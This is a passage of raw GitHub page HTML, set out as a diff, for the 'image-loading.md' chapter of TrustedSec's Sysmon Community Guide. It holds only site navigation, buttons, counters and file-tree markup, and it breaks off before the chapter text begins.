@@ -1,0 +1,649 @@
+# https://github.com/trustedsec/SysmonCommunityGuide/blob/master/chapters/image-loading.md
+
+<!DOCTYPE html><html lang="en" data-color-mode="auto" data-light-theme="light" data-dark-theme="dark" data-a11y-animated-images="system" data-a11y-link-underlines="true" class="js-focus-visible" data-js-focus-visible="" data-turbo-loaded="">
+
+  <body class="logged-out env-production page-responsive" style="word-wrap: break-word;" data-dialog-scroll-optimized="">
+    <div data-turbo-body="" class="logged-out env-production page-responsive" style="word-wrap: break-word;">
+      <div id="__primerPortalRoot__" role="region" style="z-index: 1000; position: absolute; width: 100%;" data-turbo-permanent=""></div>
+      
+
+    <div class="position-relative header-wrapper js-header-wrapper ">
+      <a href="https://github.com/trustedsec/SysmonCommunityGuide/blob/master/chapters/image-loading.md#start-of-content" data-skip-target-assigned="false" class="px-2 tmp-py-4 color-bg-accent-emphasis color-fg-on-emphasis show-on-focus js-skip-to-content">Skip to content</a>
+
+      <span data-view-component="true" class="progress-pjax-loader Progress position-fixed width-full">
+    <span style="width: 0%;" data-view-component="true" class="Progress-item progress-pjax-loader-bar left-0 top-0 color-bg-accent-emphasis"></span>
+</span>      
+      
+      <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-react-css.fd4c5c5e02474e43.module.css">
+<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/keyboard-shortcuts-dialog.e1c052a83f8fe45a.module.css">
+
+<react-partial partial-name="keyboard-shortcuts-dialog" data-ssr="false" data-attempted-ssr="false" data-react-profiling="false" data-catalyst="" class="loaded">
+  
+  
+  <div data-target="react-partial.reactRoot"><div class="d-none"></div></div>
+</react-partial>
+
+
+
+
+
+      
+
+          
+
+              
+
+
+
+
+
+
+
+
+      <div data-view-component="true" class="js-stale-session-flash stale-session-flash flash flash-warn flash-full">
+  
+        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
+    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
+</svg>
+        <span class="js-stale-session-flash-signed-in">You signed in with another tab or window. <a class="Link--inTextBlock" href="https://github.com/trustedsec/SysmonCommunityGuide/blob/master/chapters/image-loading.md">Reload</a> to refresh your session.</span>
+        <span class="js-stale-session-flash-signed-out">You signed out in another tab or window. <a class="Link--inTextBlock" href="https://github.com/trustedsec/SysmonCommunityGuide/blob/master/chapters/image-loading.md">Reload</a> to refresh your session.</span>
+        <span class="js-stale-session-flash-switched">You switched accounts on another tab or window. <a class="Link--inTextBlock" href="https://github.com/trustedsec/SysmonCommunityGuide/blob/master/chapters/image-loading.md">Reload</a> to refresh your session.</span>
+
+    <button id="icon-button-66eda38b-5c2c-498e-9bcf-616539103e5c" aria-labelledby="tooltip-6edaa343-cafb-4a75-8003-8c7b43f67ff4" type="button" data-view-component="true" class="Button Button--iconOnly Button--invisible Button--medium flash-close js-flash-close">  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x Button-visual">
+    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
+</svg>
+</button><tool-tip id="tooltip-6edaa343-cafb-4a75-8003-8c7b43f67ff4" for="icon-button-66eda38b-5c2c-498e-9bcf-616539103e5c" popover="manual" data-direction="s" data-type="label" data-view-component="true" class="sr-only position-absolute" aria-hidden="true" role="tooltip"><slot></slot>Dismiss alert</tool-tip>
+
+
+  
+</div>
+    </div>
+
+  <div id="start-of-content" class="show-on-focus"></div>
+
+
+
+
+
+
+
+
+    <div id="js-flash-container" class="flash-container" data-turbo-replace="">
+
+
+
+
+  
+    
+<div class="flash flash-full   {{ className }}">
+  <div>
+    <button autofocus="" class="flash-close js-flash-close" type="button" aria-label="Dismiss this message">
+      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
+    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
+</svg>
+    </button>
+    <div aria-atomic="true" role="alert" class="js-flash-alert">
+      
+      <div>{{ message }}</div>
+
+    </div>
+  </div>
+</div>
+  
+</div>
+
+
+    
+
+
+
+
+
+
+  <div class="application-main " data-commit-hovercards-enabled="" data-discussion-hovercards-enabled="" data-issue-and-pr-hovercards-enabled="" data-project-hovercards-enabled="">
+        <div itemscope="" itemtype="http://schema.org/SoftwareSourceCode" class="">
+    <main id="js-repo-pjax-container">
+      
+      
+    
+
+    
+
+
+
+
+
+
+  
+
+  <div id="repository-container-header" class="tmp-pt-3 hide-full-screen" style="background-color: var(--page-header-bgColor, var(--color-page-header-bg));" data-turbo-replace="">
+
+      <div class="d-flex flex-nowrap flex-justify-end tmp-mb-3  tmp-px-3 tmp-px-lg-5" style="gap: 1rem;">
+
+        <div class="flex-auto min-width-0 width-fit">
+            
+  <div class=" d-flex flex-wrap flex-items-center wb-break-word f3 text-normal">
+      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-repo color-fg-muted mr-2">
+    <path d="M2 2.5A2.5 2.5 0 0 1 4.5 0h8.75a.75.75 0 0 1 .75.75v12.5a.75.75 0 0 1-.75.75h-2.5a.75.75 0 0 1 0-1.5h1.75v-2h-8a1 1 0 0 0-.714 1.7.75.75 0 1 1-1.072 1.05A2.495 2.495 0 0 1 2 11.5Zm10.5-1h-8a1 1 0 0 0-1 1v6.708A2.486 2.486 0 0 1 4.5 9h8ZM5 12.25a.25.25 0 0 1 .25-.25h3.5a.25.25 0 0 1 .25.25v3.25a.25.25 0 0 1-.4.2l-1.45-1.087a.249.249 0 0 0-.3 0L5.4 15.7a.25.25 0 0 1-.4-.2Z"></path>
+</svg>
+    
+    <span class="author flex-self-stretch" itemprop="author">
+      <a class="url fn" rel="author" data-hovercard-type="organization" data-hovercard-url="/orgs/trustedsec/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="https://github.com/trustedsec" aria-keyshortcuts="Alt+ArrowUp">
+        trustedsec
+</a>    </span>
+    <span class="mx-1 flex-self-stretch color-fg-muted">/</span>
+    <strong itemprop="name" class="mr-2 flex-self-stretch">
+      <a data-pjax="#repo-content-pjax-container" data-turbo-frame="repo-content-turbo-frame" href="https://github.com/trustedsec/SysmonCommunityGuide">SysmonCommunityGuide</a>
+    </strong>
+
+    <span></span><span class="Label Label--secondary v-align-middle mr-1">Public</span>
+  </div>
+
+
+        </div>
+
+        <div id="repository-details-container" class="flex-shrink-0" data-turbo-replace="" style="max-width: 70%;">
+            <ul class="pagehead-actions flex-shrink-0 d-none d-md-inline" style="padding: 2px 0;">
+    
+      
+
+  <li>
+            <a href="https://github.com/login?return_to=%2Ftrustedsec%2FSysmonCommunityGuide" rel="nofollow" id="repository-details-watch-button" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;notification subscription menu watch&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;LOG_IN&quot;,&quot;originating_url&quot;:&quot;https://github.com/trustedsec/SysmonCommunityGuide/blob/master/chapters/image-loading.md&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="6acec665bca781b822b5e4cf433ed68167ded6b7f45cecf12dd1f05b1934580c" aria-label="You must be signed in to change notification settings" data-view-component="true" class="btn-sm btn" aria-describedby="tooltip-fb29056f-42f1-4b40-9d2e-d9a80911c491">    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-bell mr-2">
+    <path d="M8 16a2 2 0 0 0 1.985-1.75c.017-.137-.097-.25-.235-.25h-3.5c-.138 0-.252.113-.235.25A2 2 0 0 0 8 16ZM3 5a5 5 0 0 1 10 0v2.947c0 .05.015.098.042.139l1.703 2.555A1.519 1.519 0 0 1 13.482 13H2.518a1.516 1.516 0 0 1-1.263-2.36l1.703-2.554A.255.255 0 0 0 3 7.947Zm5-3.5A3.5 3.5 0 0 0 4.5 5v2.947c0 .346-.102.683-.294.97l-1.703 2.556a.017.017 0 0 0-.003.01l.001.006c0 .002.002.004.004.006l.006.004.007.001h10.964l.007-.001.006-.004.004-.006.001-.007a.017.017 0 0 0-.003-.01l-1.703-2.554a1.745 1.745 0 0 1-.294-.97V5A3.5 3.5 0 0 0 8 1.5Z"></path>
+</svg>Notifications
+</a>    <tool-tip id="tooltip-fb29056f-42f1-4b40-9d2e-d9a80911c491" for="repository-details-watch-button" popover="manual" data-direction="s" data-type="description" data-view-component="true" class="sr-only position-absolute" role="tooltip"><slot></slot>You must be signed in to change notification settings</tool-tip>
+
+  </li>
+
+  <li>
+          <a icon="repo-forked" id="fork-button" href="https://github.com/login?return_to=%2Ftrustedsec%2FSysmonCommunityGuide" rel="nofollow" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;repo details fork button&quot;,&quot;repository_id&quot;:235658546,&quot;auth_type&quot;:&quot;LOG_IN&quot;,&quot;originating_url&quot;:&quot;https://github.com/trustedsec/SysmonCommunityGuide/blob/master/chapters/image-loading.md&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="33e6a0c0aa258137524d493fe03bcb4f8d380af0796900bd6cb2e4e7168f0a73" data-view-component="true" class="btn-sm btn">    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-repo-forked mr-2">
+    <path d="M5 5.372v.878c0 .414.336.75.75.75h4.5a.75.75 0 0 0 .75-.75v-.878a2.25 2.25 0 1 1 1.5 0v.878a2.25 2.25 0 0 1-2.25 2.25h-1.5v2.128a2.251 2.251 0 1 1-1.5 0V8.5h-1.5A2.25 2.25 0 0 1 3.5 6.25v-.878a2.25 2.25 0 1 1 1.5 0ZM5 3.25a.75.75 0 1 0-1.5 0 .75.75 0 0 0 1.5 0Zm6.75.75a.75.75 0 1 0 0-1.5.75.75 0 0 0 0 1.5Zm-3 8.75a.75.75 0 1 0-1.5 0 .75.75 0 0 0 1.5 0Z"></path>
+</svg>Fork
+    <span id="repo-network-counter" data-pjax-replace="true" data-turbo-replace="true" title="184" data-view-component="true" class="Counter">184</span>
+</a>
+  </li>
+
+  <li>
+        <div data-view-component="true" class="BtnGroup d-flex">
+        <a href="https://github.com/login?return_to=%2Ftrustedsec%2FSysmonCommunityGuide" rel="nofollow" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;star button&quot;,&quot;repository_id&quot;:235658546,&quot;auth_type&quot;:&quot;LOG_IN&quot;,&quot;originating_url&quot;:&quot;https://github.com/trustedsec/SysmonCommunityGuide/blob/master/chapters/image-loading.md&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="ab646b78de9c1c361110455248908c700608ae798187ed8077f63f64114455cf" aria-label="You must be signed in to star a repository" data-view-component="true" class="tooltipped tooltipped-sw btn-sm btn">    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-star v-align-text-bottom d-inline-block mr-2">
+    <path d="M8 .25a.75.75 0 0 1 .673.418l1.882 3.815 4.21.612a.75.75 0 0 1 .416 1.279l-3.046 2.97.719 4.192a.751.751 0 0 1-1.088.791L8 12.347l-3.766 1.98a.75.75 0 0 1-1.088-.79l.72-4.194L.818 6.374a.75.75 0 0 1 .416-1.28l4.21-.611L7.327.668A.75.75 0 0 1 8 .25Zm0 2.445L6.615 5.5a.75.75 0 0 1-.564.41l-3.097.45 2.24 2.184a.75.75 0 0 1 .216.664l-.528 3.084 2.769-1.456a.75.75 0 0 1 .698 0l2.77 1.456-.53-3.084a.75.75 0 0 1 .216-.664l2.24-2.183-3.096-.45a.75.75 0 0 1-.564-.41L8 2.694Z"></path>
+</svg><span data-view-component="true" class="d-inline">
+          Star
+</span>          <span id="repo-stars-counter-star" aria-label="1384 users starred this repository" data-singular-suffix="user starred this repository" data-plural-suffix="users starred this repository" data-turbo-replace="true" title="1,384" data-view-component="true" class="Counter js-social-count">1.4k</span>
+</a></div>
+  </li>
+
+</ul>
+
+        </div>
+      </div>
+
+        <div id="responsive-meta-container" data-turbo-replace="">
+</div>
+
+
+          
+
+  </div>
+  
+
+
+
+<turbo-frame id="repo-content-turbo-frame" target="_top" data-turbo-action="advance" class="">
+    <div id="repo-content-pjax-container" class="repository-content ">
+    
+
+
+
+    
+      
+    
+
+
+
+
+
+
+
+
+<react-app app-name="code-view" initial-path="/trustedsec/SysmonCommunityGuide/blob/master/chapters/image-loading.md" style="display: block; min-height: calc(100vh - 64px);" data-attempted-ssr="true" data-ssr="true" data-lazy="false" data-alternate="false" data-data-router-enabled="true" data-react-profiling="false" data-catalyst="" class="loaded">
+  
+  
+  <div data-target="react-app.reactRoot"> <!-- --> <a id="code-view-repo-link" href="https://github.com/trustedsec/SysmonCommunityGuide" data-discover="true"></a> <button data-testid="header-permalink-button" data-hotkey-scope="read-only-cursor-text-area" data-hotkey="y,Shift+Y"></button><button data-hotkey="y,Shift+Y"></button><div><div style="--spacing:var(--spacing-none)" class="prc-PageLayout-PageLayoutRoot--KH-d"><div class="prc-PageLayout-PageLayoutWrapper-2BhU2" data-width="full"><div class="prc-PageLayout-PageLayoutContent-BneH9"><div class="CodeViewFileTreeLayout-module__sidebar__n_Aau" tabindex="0"><div class="prc-PageLayout-PaneWrapper-pHPop ReposFileTreePane-module__Pane__rBZpI ReposFileTreePane-module__HidePane__VHAVt" style="--offset-header:0px;--spacing-row:var(--spacing-none);--spacing-column:var(--spacing-none)" data-is-hidden="false" data-position="start" data-sticky="true"><div class="prc-PageLayout-HorizontalDivider-JLVqp prc-PageLayout-PaneHorizontalDivider-9tbnE" data-variant-regular="none" data-variant-narrow="none" data-position="start" style="--spacing-divider:var(--spacing-none);--spacing:var(--spacing-none)"></div><div class="prc-PageLayout-Pane-AyzHK" data-resizable="true" style="--spacing: var(--spacing-none); --pane-min-width: 256px; --pane-max-width: 961px; --pane-width-size: var(--pane-width-large); --pane-width: 320px;" data-dragging="true"><div><div id="repos-file-tree" class="ReposFileTreePane-module__PaneContents__SJjfF"><div class="ReposFileTreePane-module__Box_1__PpIop"><div class="d-flex width-full pr-mb-3 flex-items-center"><h2 class="use-tree-pane-module__Heading__s4QbZ prc-Heading-Heading-MtWFE"><button data-component="IconButton" type="button" data-testid="collapse-file-tree-button" aria-expanded="true" aria-controls="repos-file-tree" data-hotkey="Control+b" class="prc-Button-ButtonBase-9n-Xk position-relative ExpandFileTreeButton-module__expandButton__hDOcv fgColor-muted prc-Button-IconButton-fyge7" data-loading="false" data-no-visuals="true" data-size="medium" data-variant="invisible" aria-labelledby="_r_68_"><svg aria-hidden="true" focusable="false" class="octicon octicon-sidebar-expand" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align: text-bottom;"><path d="m4.177 7.823 2.396-2.396A.25.25 0 0 1 7 5.604v4.792a.25.25 0 0 1-.427.177L4.177 8.177a.25.25 0 0 1 0-.354Z"></path><path d="M0 1.75C0 .784.784 0 1.75 0h12.5C15.216 0 16 .784 16 1.75v12.5A1.75 1.75 0 0 1 14.25 16H1.75A1.75 1.75 0 0 1 0 14.25Zm1.75-.25a.25.25 0 0 0-.25.25v12.5c0 .138.112.25.25.25H9.5v-13Zm12.5 13a.25.25 0 0 0 .25-.25V1.75a.25.25 0 0 0-.25-.25H11v13Z"></path></svg></button><span class="prc-TooltipV2-Tooltip-tLeuB" data-direction="se" aria-hidden="true" id="_r_68_" popover="auto">Collapse file tree</span><button data-testid="" data-hotkey="Control+b" data-hotkey-scope="read-only-cursor-text-area"></button></h2><h2 class="CodeViewFileTreeLayout-module__heading__A1Iqk">Files</h2></div><div class="ReposFileTreePane-module__Box_2__g74WI"><div class="ReposFileTreePane-module__Box_3__D6cTp"><button type="button" aria-haspopup="true" aria-expanded="false" tabindex="0" data-hotkey="w" aria-label="master branch" data-testid="anchor-button" data-icv-name="Switch branches/tags" class="prc-Button-ButtonBase-9n-Xk react-repos-tree-pane-ref-selector width-full ref-selector-class RefSelectorAnchoredOverlay-module__RefSelectorOverlayBtn__a3WK3" data-loading="false" data-size="medium" data-variant="default" id="ref-picker-repos-header-ref-selector" style="min-width: 0px;"><span data-component="buttonContent" data-align="center" class="prc-Button-ButtonContent-Iohp5"><span data-component="text" class="prc-Button-Label-FWkx3"><div class="RefSelectorAnchoredOverlay-module__RefSelectorOverlayContainer__yaf4p"><div class="RefSelectorAnchoredOverlay-module__RefSelectorOverlayHeader__XtXRG"><svg aria-hidden="true" focusable="false" class="octicon octicon-git-branch" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align: text-bottom;"><path d="M9.5 3.25a2.25 2.25 0 1 1 3 2.122V6A2.5 2.5 0 0 1 10 8.5H6a1 1 0 0 0-1 1v1.128a2.251 2.251 0 1 1-1.5 0V5.372a2.25 2.25 0 1 1 1.5 0v1.836A2.493 2.493 0 0 1 6 7h4a1 1 0 0 0 1-1v-.628A2.25 2.25 0 0 1 9.5 3.25Zm-6 0a.75.75 0 1 0 1.5 0 .75.75 0 0 0-1.5 0Zm8.25-.75a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5ZM4.25 12a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5Z"></path></svg></div><div class="ref-selector-button-text-container RefSelectorAnchoredOverlay-module__RefSelectorBtnTextContainer__Di3rk"><span class="RefSelectorAnchoredOverlay-module__RefSelectorText__w_fmP">&nbsp;master</span></div></div></span><span data-component="trailingVisual" class="prc-Button-Visual-YNt2F prc-Button-VisualWrap-E4cnq"><svg aria-hidden="true" focusable="false" class="octicon octicon-triangle-down" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align: text-bottom;"><path d="m4.427 7.427 3.396 3.396a.25.25 0 0 0 .354 0l3.396-3.396A.25.25 0 0 0 11.396 7H4.604a.25.25 0 0 0-.177.427Z"></path></svg></span></span></button><button data-testid="ref-selector-hotkey-button" data-hotkey="w" data-hotkey-scope="read-only-cursor-text-area"></button></div><div class="ReposFileTreePane-module__Box_4__DG4pa"><button data-component="IconButton" type="button" data-hotkey="/" class="prc-Button-ButtonBase-9n-Xk SearchButton-module__IconButton__SBlqu prc-Button-IconButton-fyge7" data-loading="false" data-no-visuals="true" data-size="medium" data-variant="default" aria-labelledby="_r_6e_"><svg aria-hidden="true" focusable="false" class="octicon octicon-search" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align: text-bottom;"><path d="M10.68 11.74a6 6 0 0 1-7.922-8.982 6 6 0 0 1 8.982 7.922l3.04 3.04a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215ZM11.5 7a4.499 4.499 0 1 0-8.997 0A4.499 4.499 0 0 0 11.5 7Z"></path></svg></button><span class="prc-TooltipV2-Tooltip-tLeuB" data-direction="nw" aria-hidden="true" id="_r_6e_" popover="auto">Search this repository</span><button data-testid="" data-hotkey="/" data-hotkey-scope="read-only-cursor-text-area"></button></div></div></div><div class="ReposFileTreePane-module__FileResultsList__zmSnM"><span class="d-flex FileResultsList-module__FilesSearchBox__ivVkc TextInput-wrapper prc-components-TextInputWrapper-Hpdqi prc-components-TextInputBaseWrapper-wY-n0" data-leading-visual="true" data-trailing-visual="true" aria-busy="false"><span class="TextInput-icon" id="_r_6g_" aria-hidden="true"><svg aria-hidden="true" focusable="false" class="octicon octicon-search" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align: text-bottom;"><path d="M10.68 11.74a6 6 0 0 1-7.922-8.982 6 6 0 0 1 8.982 7.922l3.04 3.04a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215ZM11.5 7a4.499 4.499 0 1 0-8.997 0A4.499 4.499 0 0 0 11.5 7Z"></path></svg></span><input aria-label="Go to file" role="combobox" aria-controls="file-results-list" aria-expanded="false" aria-haspopup="dialog" autocorrect="off" spellcheck="false" placeholder="Go to file" aria-describedby="_r_6g_ _r_6h_" data-component="input" class="prc-components-Input-IwWrt" type="text" value=""><span class="TextInput-icon" id="_r_6h_" aria-hidden="true"></span></span></div><button data-testid="" data-hotkey="t,Shift+T" data-hotkey-scope="read-only-cursor-text-area"></button><button data-hotkey="t,Shift+T"></button><div class="ReposFileTreePane-module__Box_5__Zy_o6"><div style="height: 1px; margin-top: -1px; width: 100%; flex-shrink: 0;"></div><div><div class="react-tree-show-tree-items"><div class="ReposFileTreeView-module__Box__vkb5W" data-testid="repos-file-tree-container"></div></div></div></div></div></div></div><div class="prc-PageLayout-VerticalDivider-9QRmK prc-PageLayout-PaneVerticalDivider-le57g" data-variant-narrow="none" data-variant-regular="line" data-variant-wide="line" data-position="start" style="--spacing:var(--spacing-none)"><div class="prc-PageLayout-DraggableHandle-9s6B4" role="slider" aria-label="Draggable pane splitter" aria-valuemin="256" aria-valuemax="961" aria-valuenow="320" aria-valuetext="Pane width 320 pixels" tabindex="0"></div></div></div></div><div class="prc-PageLayout-ContentWrapper-gR9eG" data-is-hidden-narrow="true" data-dragging="true"><div class="prc-PageLayout-Content-xWL-A" data-width="full" style="--spacing:var(--spacing-none)"><div class="SharedPageLayout-module__content__IwGAp" data-selector="repos-split-pane-content" tabindex="0"> <!-- --> <div class="container CodeViewHeader-module__Box__JkPOb"><div class="CodeViewHeader-module__StickyHeader__Qn7UN" id="StickyHeader"><div class="CodeViewHeader-module__Box_1__SbNDV"><div class="CodeViewHeader-module__Box_2__TB46f"><div class="CodeViewHeader-module__Box_6__qKUtX"><div class="Breadcrumb-module__container__Vxvev Breadcrumb-module__lg__Rjz0A"><div data-testid="breadcrumbs-filename" class="Breadcrumb-module__filename__equZR"><span class="Breadcrumb-module__separator__eNwsI Breadcrumb-module__lg__Rjz0A" aria-hidden="true">/</span><h1 class="Breadcrumb-module__filenameHeading__MNMtw Breadcrumb-module__lg__Rjz0A prc-Heading-Heading-MtWFE" tabindex="-1" id="file-name-id-wide">image-loading.md</h1></div><button data-component="IconButton" type="button" class="prc-Button-ButtonBase-9n-Xk ml-2 prc-Button-IconButton-fyge7" data-loading="false" data-no-visuals="true" data-size="small" data-variant="invisible" aria-labelledby="_r_6m_"><svg aria-hidden="true" focusable="false" class="octicon octicon-copy" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align: text-bottom;"><path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path></svg></button><span class="CopyToClipboardButton-module__tooltip__BhMvU prc-TooltipV2-Tooltip-tLeuB" data-direction="nw" aria-label="Copy path" aria-hidden="true" id="_r_6m_" popover="auto">Copy path</span></div></div><div class="react-code-view-header-element--wide"><div class="CodeViewHeader-module__Box_7___0R6c"><div class="d-flex gap-2"><button type="button" style="display:none" class="prc-Button-ButtonBase-9n-Xk NavigationMenu-module__Button__LpKgm" data-loading="false" data-no-visuals="true" data-size="medium" data-variant="default" data-hotkey="b,Shift+B,Control+/ Control+b"><span data-component="buttonContent" data-align="center" class="prc-Button-ButtonContent-Iohp5"><span data-component="text" class="prc-Button-Label-FWkx3">Blame</span></span></button><button data-testid="" data-hotkey-scope="read-only-cursor-text-area" data-hotkey="b,Shift+B,Control+/ Control+b"></button><button data-component="IconButton" type="button" data-testid="more-file-actions-button-nav-menu-wide" aria-haspopup="true" aria-expanded="false" tabindex="0" class="prc-Button-ButtonBase-9n-Xk js-blob-dropdown-click NavigationMenu-module__IconButton__HpX3G prc-Button-IconButton-fyge7" data-loading="false" data-no-visuals="true" data-size="medium" data-variant="default" aria-labelledby="_R_7p6dajal1d_" id="_R_96dajal1d_"><svg aria-hidden="true" focusable="false" class="octicon octicon-kebab-horizontal" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M8 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3ZM1.5 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm13 0a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path></svg></button><span class="prc-TooltipV2-Tooltip-tLeuB" data-direction="nw" aria-hidden="true" id="_R_7p6dajal1d_" popover="auto">More file actions</span></div></div></div><div class="react-code-view-header-element--narrow"><div class="CodeViewHeader-module__Box_7___0R6c"><div class="d-flex gap-2"><button type="button" style="display:none" class="prc-Button-ButtonBase-9n-Xk NavigationMenu-module__Button__LpKgm" data-loading="false" data-no-visuals="true" data-size="medium" data-variant="default" data-hotkey="b,Shift+B,Control+/ Control+b"><span data-component="buttonContent" data-align="center" class="prc-Button-ButtonContent-Iohp5"><span data-component="text" class="prc-Button-Label-FWkx3">Blame</span></span></button><button data-testid="" data-hotkey-scope="read-only-cursor-text-area" data-hotkey="b,Shift+B,Control+/ Control+b"></button><button data-component="IconButton" type="button" data-testid="more-file-actions-button-nav-menu-narrow" aria-haspopup="true" aria-expanded="false" tabindex="0" class="prc-Button-ButtonBase-9n-Xk js-blob-dropdown-click NavigationMenu-module__IconButton__HpX3G prc-Button-IconButton-fyge7" data-loading="false" data-no-visuals="true" data-size="medium" data-variant="default" aria-labelledby="_R_7p7dajal1d_" id="_R_97dajal1d_"><svg aria-hidden="true" focusable="false" class="octicon octicon-kebab-horizontal" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M8 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3ZM1.5 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm13 0a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path></svg></button><span class="prc-TooltipV2-Tooltip-tLeuB" data-direction="nw" aria-hidden="true" id="_R_7p7dajal1d_" popover="auto">More file actions</span></div></div></div></div></div></div></div><div class="CodeView-module__contentWrapper__cG2JH"><div class="react-code-view-bottom-padding"><div class="BlobTopBanners-module__Box__v_nvx"></div></div> <button data-testid="" data-hotkey-scope="read-only-cursor-text-area" data-hotkey="r,Shift+R"></button><button data-hotkey="r,Shift+R"></button><div class="d-flex flex-column border rounded-2 tmp-mb-3 pl-1"><div class="LatestCommit-module__Box__B25ZT"><h2 class="sr-only ScreenReaderHeading-module__userSelectNone__rwWIk prc-Heading-Heading-MtWFE" data-testid="screen-reader-heading">Latest commit</h2><div data-testid="latest-commit" class="LatestCommit-module__Box_1__YkEgg"><div class="CommitAttribution-module__CommitAttributionContainer__I_rfs"><div data-testid="author-avatar" class="Box-sc-62in7e-0 AuthorAvatar-module__AuthorAvatarContainer__n0MVc"><a class="Link__StyledLink-sc-1syctfj-0 prc-Link-Link-9ZwDx" href="https://github.com/darkoperator" data-testid="avatar-icon-link" data-hovercard-url="/users/darkoperator/hovercard" data-hovercard-type="user" octo-click="hovercard-link-click" octo-dimensions="link_type:self" aria-keyshortcuts="Alt+ArrowUp"><img data-component="Avatar" class="AuthorAvatar-module__authorAvatarImage__a3R8x prc-Avatar-Avatar-0xaUi" alt="darkoperator" width="20" height="20" data-testid="github-avatar" aria-label="darkoperator" src="https://avatars.githubusercontent.com/u/521246?v=4&amp;size=40" style="--avatarSize-regular: 20px;"></a><a class="Link__StyledLink-sc-1syctfj-0 iIGVMW AuthorAvatar-module__authorHoverableLink__MHTT8 prc-Link-Link-9ZwDx" data-muted="true" href="https://github.com/trustedsec/SysmonCommunityGuide/commits?author=darkoperator" aria-label="commits by darkoperator" data-hovercard-url="/users/darkoperator/hovercard" data-hovercard-type="user" octo-click="hovercard-link-click" octo-dimensions="link_type:self" aria-keyshortcuts="Alt+ArrowUp">darkoperator</a></div><span class=""></span></div><div class="d-none d-sm-flex 